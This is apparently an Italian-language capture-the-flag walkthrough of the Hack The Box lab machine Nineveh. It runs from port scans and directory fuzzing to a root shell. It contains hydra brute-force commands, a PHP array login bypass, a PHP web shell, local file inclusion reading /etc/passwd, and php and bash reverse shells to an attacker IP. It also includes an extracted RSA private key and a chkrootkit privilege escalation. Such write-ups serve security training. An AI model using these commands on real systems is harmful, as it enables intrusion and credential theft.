@@ -1,0 +1,414 @@
+10.10.10.43
+
+masscan -p1-65535 10.10.10.43 --rate 1000 --open --banners -e tun0
+
+Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2021-10-24 10:28:44 GMT
+Initiating SYN Stealth Scan
+Scanning 1 hosts [65535 ports/host]
+Discovered open port 80/tcp on 10.10.10.43                                     
+Discovered open port 443/tcp on 10.10.10.43     
+
+map -A -p80,443 10.10.10.43
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-24 12:30 CEST
+Nmap scan report for 10.10.10.43
+Host is up (0.17s latency).
+
+PORT    STATE SERVICE  VERSION
+80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+| ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR
+| Not valid before: 2017-07-01T15:03:30
+|_Not valid after:  2018-07-01T15:03:30
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn: 
+|_  http/1.1
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 30.76 seconds
+
+ci sono due server web diversi:
+
+80 -> http -> pagina di default del web server 
+443 -> https -> pagina con una singola immagine
+
+provo ad aggiungere nineveh.htb al file /etc/hosts
+non cambia nulla
+
+provo a fare fuzzing con dirb:
+
+PORT 80:
+dirb http://10.10.10.43/             
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Sun Oct 24 12:41:07 2021
+URL_BASE: http://10.10.10.43/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://10.10.10.43/ ----
++ http://10.10.10.43/index.html (CODE:200|SIZE:178)                                                                   
++ http://10.10.10.43/info.php (CODE:200|SIZE:83767)                                                                  
++ http://10.10.10.43/server-status (CODE:403|SIZE:299) 
+http://10.10.10.43/department/login.php             ---> pagina di login                                                              
+                                                                                                                     
+-----------------
+END_TIME: Sun Oct 24 13:09:43 2021
+DOWNLOADED: 4612 - FOUND: 3
+
+
+info.php contiene los cript phpinfo() che insieme ad un'altra pagina che permette una local file inclusion può dare la possibilità di avere rce:
+https://github.com/sinsinsecurity/phpinfo-Local-File-Inclusion
+purtroppo manca la pagina con lfi (local file inclusion)
+
+PORT 443:
+
+dirb https://10.10.10.43/            
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Sun Oct 24 12:41:17 2021
+URL_BASE: https://10.10.10.43/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: https://10.10.10.43/ ----
+==> DIRECTORY: https://10.10.10.43/db/                                                                              
++ https://10.10.10.43/index.html (CODE:200|SIZE:49)                                                                 
++ https://10.10.10.43/server-status (CODE:403|SIZE:300)
+https://10.10.10.43:443/secure_notes/
+
+
+
+
+in https://10.10.10.43:443/secure_notes/ c'è solo un'immagine, potrebbe esserci codificato qualcosa all'interno??
+
+tra le due pagine di login trovate mi concentro prima su quella di phpliteadmin perchè c'è una vulnerabilità:
+https://10.10.10.43/db/         --> PHPLiteAdmin, una volta ottenuto l'accesso c'è la possibilità di rce (https://www.exploit-db.com/exploits/24044)
+prima però si deve ottenere l'accesso.
+
+posso provare con hydra.
+
+la richiesta è:
+
+POST /db/index.php HTTP/1.1
+Host: 10.10.10.43
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://10.10.10.43/db/index.php
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 56
+Origin: https://10.10.10.43
+Connection: close
+Cookie: PHPSESSID=29gfindnkivh4vlib70r1h2ar6
+Upgrade-Insecure-Requests: 1
+
+password=prova&remember=yes&login=Log+In&proc_login=true
+
+il comando hydra è:
+sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password."
+
+[443][http-post-form] host: 10.10.10.43   login: admin   password: password123
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-10-24 17:54:18
+
+
+si accede con password123 (admin è stato messo come segnaposto, in realtà non richiede user solo la pwd)
+ora posso eseguire l'exploit e ottenere rce:
+https://www.exploit-db.com/exploits/24044
+
+come comando php metto:
+<?php echo system($_REQUEST["cmd"]);?>
+
+il file viene creato sotto /var/tmp/daerves.php a cui non si può accedere quindi non si può usare questo path per ora
+
+si può provare ad accedere alla pagina di login su department:
+
+da due errori diversi per username e pwd sbagliati,
+Invalid Password!  invalid username
+
+quindi si riesce ad enumerare gli usernames indipendentemente dalla pwd, la richiesta è fatta:
+
+POST /department/login.php HTTP/1.1
+Host: 10.10.10.43
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 32
+Origin: http://10.10.10.43
+Connection: close
+Referer: http://10.10.10.43/department/login.php
+Cookie: PHPSESSID=29gfindnkivh4vlib70r1h2ar6
+Upgrade-Insecure-Requests: 1
+
+username=admin&password=password
+
+tra l'altro admin è corretto (da solo Invalid Password! e non invalid username)
+
+quindi rimane da prendere la pwd. possiamo fare in due modi:
+
+1) hydra -> 
+    sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=admin&password=^PASS^:Invalid Password!"
+
+    [80][http-post-form] host: 10.10.10.43   login: admin   password: 1q2w3e4r5t
+
+
+2) sfruttare un possibile errore di sintassi di php ->
+
+    POST /department/login.php HTTP/1.1
+Host: 10.10.10.43
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 26
+Origin: http://10.10.10.43
+Connection: close
+Referer: http://10.10.10.43/department/login.php
+Cookie: PHPSESSID=29gfindnkivh4vlib70r1h2ar6
+Upgrade-Insecure-Requests: 1
+
+username=admin&password[]=
+
+questo permette di fare il login direttamente e funziona perchè solitamente si usa string compare per vedere se la pwd inserita 
+è uguale a quella presente nel db ( o hard coded addirittura) e ci si aspetta che ritorna 0 per dire che sono uguali.
+passando un array di stringhe al posto di una singola stringa, la string compare fallisce MA ritorna comunque NULL che in php quando comparato con 0 ritorna true q quindi siamo autenticati. 
+
+comunque una volta avuto accesso a department si ottiene una pagina per admin
+ancora in costruzione è presente una sezione notes:
+http://10.10.10.43/department/manage.php?notes=files/ninevehNotes.txt
+
+Have you fixed the login page yet! hardcoded username and password is really bad idea!
+
+check your serect folder to get in! figure it out! this is your challenge
+
+Improve the db interface.
+~amrois
+
+
+la cosa importante è che in questa pagina è possibile accedere a dei file, quindi potrebbe essere possibile avere una lfi (utile sia per il primo path individuato di usare info.php sia per il db inserito prima)
+
+provando altri path da "No Note is selected."
+
+dopo vari tentativi pare che se la parola ninevehNotes non è nel path non da alcuna risposta
+mentre se è presente da:
+
+Warning:  include(files/ninevehNotes/../../../etc/passwd): failed to open stream: No such file or directory in /var/www/html/department/manage.php on line 31
+
+
+
+Warning:  include(): Failed opening 'files/ninevehNotes/../../../etc/passwd' for inclusion (include_path='.:/usr/share/php') in /var/www/html/department/manage.php on line 31
+
+basandomi su questo messaggio di errore riesco a ottenere il file /etc/passwd:
+
+http://10.10.10.43/department/manage.php?notes=files/ninevehNotes/../../../../../../../etc/passwd
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+syslog:x:104:108::/home/syslog:/bin/false
+_apt:x:105:65534::/nonexistent:/bin/false
+lxd:x:106:65534::/var/lib/lxd/:/bin/false
+mysql:x:107:111:MySQL Server,,,:/nonexistent:/bin/false
+messagebus:x:108:112::/var/run/dbus:/bin/false
+uuidd:x:109:113::/run/uuidd:/bin/false
+dnsmasq:x:110:65534:dnsmasq,,,:/var/lib/misc:/bin/false
+amrois:x:1000:1000:,,,:/home/amrois:/bin/bash
+sshd:x:111:65534::/var/run/sshd:/usr/sbin/nologin
+
+
+a questo punto devo cercare di eseguire la shell php che ho caricato prima
+
+provo al path:
+
+http://10.10.10.43/department/manage.php?notes=files/ninevehNotes/../../../../../../../var/tmp/daerves.php?cmd=id
+
+File name too long.
+
+http://10.10.10.43/department/manage.php?notes=/ninevehNotes/../../../var/tmp/daerves.php?cmd=id
+
+http://10.10.10.43/department/manage.php?notes=files/../../../tmp/ninevehNotes.php?cmd=id
+
+la trova così:
+
+//ricreo il db e metto come nome ninevehNotes così noin devo inserirlo a inizio stringa risparmiando sulla lunghezza del nome
+http://10.10.10.43/department/manage.php?notes=files/../../../../tmp/ninevehNotes.php ma non prende il comando passandolo con ?
+
+funziona con:
+
+http://10.10.10.43/department/manage.php?notes=files/../../../../tmp/ninevehNotes.php&cmd=id
+
+quindi gli passo il comando per la reverse shell (con url encoding)
+
+php -r '$sock=fsockopen("10.10.16.4",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+http://10.10.10.43/department/manage.php?notes=files/../../../../tmp/ninevehNotes.php&cmd=php%20-r%20%27%24sock%3Dfsockopen(%2210.10.16.4%22%2C1234)%3Bexec(%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22)%3B%27
+
+ora ho una rev shell con www-data
+
+
+tra l'altro tornando all'immagine trovata sotto secure_notes usando strings trovo all'interno:
+
+www-data
+www-data
+-----BEGIN RSA PRIVATE KEY-----
+MIIEowIBAAKCAQEAri9EUD7bwqbmEsEpIeTr2KGP/wk8YAR0Z4mmvHNJ3UfsAhpI
+H9/Bz1abFbrt16vH6/jd8m0urg/Em7d/FJncpPiIH81JbJ0pyTBvIAGNK7PhaQXU
+PdT9y0xEEH0apbJkuknP4FH5Zrq0nhoDTa2WxXDcSS1ndt/M8r+eTHx1bVznlBG5
+FQq1/wmB65c8bds5tETlacr/15Ofv1A2j+vIdggxNgm8A34xZiP/WV7+7mhgvcnI
+3oqwvxCI+VGhQZhoV9Pdj4+D4l023Ub9KyGm40tinCXePsMdY4KOLTR/z+oj4sQT
+X+/1/xcl61LADcYk0Sw42bOb+yBEyc1TTq1NEQIDAQABAoIBAFvDbvvPgbr0bjTn
+KiI/FbjUtKWpWfNDpYd+TybsnbdD0qPw8JpKKTJv79fs2KxMRVCdlV/IAVWV3QAk
+FYDm5gTLIfuPDOV5jq/9Ii38Y0DozRGlDoFcmi/mB92f6s/sQYCarjcBOKDUL58z
+GRZtIwb1RDgRAXbwxGoGZQDqeHqaHciGFOugKQJmupo5hXOkfMg/G+Ic0Ij45uoR
+JZecF3lx0kx0Ay85DcBkoYRiyn+nNgr/APJBXe9Ibkq4j0lj29V5dT/HSoF17VWo
+9odiTBWwwzPVv0i/JEGc6sXUD0mXevoQIA9SkZ2OJXO8JoaQcRz628dOdukG6Utu
+Bato3bkCgYEA5w2Hfp2Ayol24bDejSDj1Rjk6REn5D8TuELQ0cffPujZ4szXW5Kb
+ujOUscFgZf2P+70UnaceCCAPNYmsaSVSCM0KCJQt5klY2DLWNUaCU3OEpREIWkyl
+1tXMOZ/T5fV8RQAZrj1BMxl+/UiV0IIbgF07sPqSA/uNXwx2cLCkhucCgYEAwP3b
+vCMuW7qAc9K1Amz3+6dfa9bngtMjpr+wb+IP5UKMuh1mwcHWKjFIF8zI8CY0Iakx
+DdhOa4x+0MQEtKXtgaADuHh+NGCltTLLckfEAMNGQHfBgWgBRS8EjXJ4e55hFV89
+P+6+1FXXA1r/Dt/zIYN3Vtgo28mNNyK7rCr/pUcCgYEAgHMDCp7hRLfbQWkksGzC
+fGuUhwWkmb1/ZwauNJHbSIwG5ZFfgGcm8ANQ/Ok2gDzQ2PCrD2Iizf2UtvzMvr+i
+tYXXuCE4yzenjrnkYEXMmjw0V9f6PskxwRemq7pxAPzSk0GVBUrEfnYEJSc/MmXC
+iEBMuPz0RAaK93ZkOg3Zya0CgYBYbPhdP5FiHhX0+7pMHjmRaKLj+lehLbTMFlB1
+MxMtbEymigonBPVn56Ssovv+bMK+GZOMUGu+A2WnqeiuDMjB99s8jpjkztOeLmPh
+PNilsNNjfnt/G3RZiq1/Uc+6dFrvO/AIdw+goqQduXfcDOiNlnr7o5c0/Shi9tse
+i6UOyQKBgCgvck5Z1iLrY1qO5iZ3uVr4pqXHyG8ThrsTffkSVrBKHTmsXgtRhHoc
+il6RYzQV/2ULgUBfAwdZDNtGxbu5oIUB938TCaLsHFDK6mSTbvB/DywYYScAWwF7
+fw4LVXdQMjNJC3sn3JaqY1zJkE4jXlZeNQvCx4ZadtdJD9iO+EUG
+-----END RSA PRIVATE KEY-----
+secret/nineveh.pub
+0000644
+0000041
+0000041
+00000000620
+13126060277
+014541
+ustar  
+www-data
+www-data
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuL0RQPtvCpuYSwSkh5OvYoY//CTxgBHRniaa8c0ndR+wCGkgf38HPVpsVuu3Xq8fr+N3ybS6uD8Sbt38Umdyk+IgfzUlsnSnJMG8gAY0rs+FpBdQ91P3LTEQQfRqlsmS6Sc/gUflmurSeGgNNrZbFcNxJLWd238zyv55MfHVtXOeUEbkVCrX/CYHrlzxt2zm0ROVpyv/Xk5+/UDaP68h2CDE2CbwDfjFmI/9ZXv7uaGC9ycjeirC/EIj5UaFBmGhX092Pj4PiXTbdRv0rIabjS2KcJd4+wx1jgo4tNH/P6iPixBNf7/X/FyXrUsANxiTRLDjZs5v7IETJzVNOrU0R amrois@nineveh.htb
+
+(si posso estrarre con binwalk -e nineveh.png)
+
+
+che sembrano essere le chiavi private/pubbliche dell'utente amrois@nineveh.htb
+posso accedere con ssh tramite la chiave privata (con l'opzione -i) 
+ma ssh non risulta attivo sulla macchina almeno per lo scan fatto, ora che ho una shell all'interno posso provare ad attivarlo o capire se è attivo ecc
+
+
+
+a quanto pare ssh è già running:
+
+root      1265  0.0  0.5  65524  5480 ?        Ss   Oct23   0:00 /usr/sbin/sshd -D
+
+ma c'è in esecuziona anche knockd che serve per chiudere delle porte, ammenoche non cia sia l'accesso con una tipologia di traffico specifico
+quindi nmap veniva bloccato ma se riusciamo a generare un traffico corretto dovremmo riuscire ad accedere alla porta di ssh 
+
+www-data@nineveh:/var/www/html/department$ cat /etc/kno	
+cat /etc/knockd.conf 
+[options]
+ logfile = /var/log/knockd.log
+ interface = ens160
+
+[openSSH]
+ sequence = 571, 290, 911 
+ seq_timeout = 5
+ start_command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
+ tcpflags = syn
+
+[closeSSH]
+ sequence = 911,290,571
+ seq_timeout = 5
+ start_command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
+ tcpflags = syn
+
+
+open ssh accetta solo quella sequenza mentre vengono bloccate le sequenze nella clausola closeSSH
+
+per eseguire la sequenza di knock installo knockd
+
+knock 10.10.10.43 571 290 911; ssh -i _nineveh.png.extracted/secret/nineveh.priv amrois@nineveh.htb
+
+
+ora sono riuscito ad accedere come amrois e prendere il file user.txt
+
+non sembra esserci nulla di interessante a parte una directory /reports e dentro una serie di file txt (aggiornati periodicamente)
+che sembrano contenere i risultati di una scansione antivirus/antivuln eseguita periodicamente:
+
+
+Searching for Suckit rootkit... Warning: /sbin/init INFECTED
+
+cercando online i vari logs capisco che si tratta di chkrootkit --> chkrootkit: shell script that checks system binaries for rootkit modification.
+http://www.chkrootkit.org/
+
+(si poteva usare anche pspy)
+
+chkrootkit ha una vulnerability che permette di fare privesc:    https://www.exploit-db.com/exploits/33899
+metto una reverse shell nel file update sotto 7tmp e alla prossima esecuzione ottengo rev shell come root
+
+echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.16.4/4242 0>&1' > update
+
+
+
+root@nineveh:~# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+root@nineveh:~# pwd
+pwd
+/root
+root@nineveh:~# cat roo	
+cat root.txt 
+1bf7d542b51b3537bf80c7c55091b68c
+root@nineveh:~# 
+
+
+
+
+
+
+
+
+
+
